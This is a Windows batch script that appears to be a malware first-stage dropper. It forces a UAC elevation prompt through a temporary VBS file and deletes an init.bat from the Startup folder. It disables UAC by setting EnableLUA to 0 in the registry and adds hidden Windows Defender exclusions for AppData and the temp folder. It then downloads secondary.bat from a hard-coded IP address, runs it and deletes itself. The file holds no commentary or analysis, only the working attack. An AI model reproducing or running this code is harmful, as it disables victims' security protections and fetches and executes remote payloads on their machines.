@echo off

if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
if '%errorlevel%' NEQ '0' (
    @rem echo Request admin priv
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\init.bat"
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath C:/Users/%username%/AppData/Roaming/Microsoft/Windows/
powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "$env:temp"
cd C:\Users\%username%\AppData\Local\Temp\MicroWindows
mkdir Logs
powershell -windowstyle hidden curl http://34.88.221.44:9000/secondary.bat -o secondary.bat
start "" secondary.bat
del "%~f0"

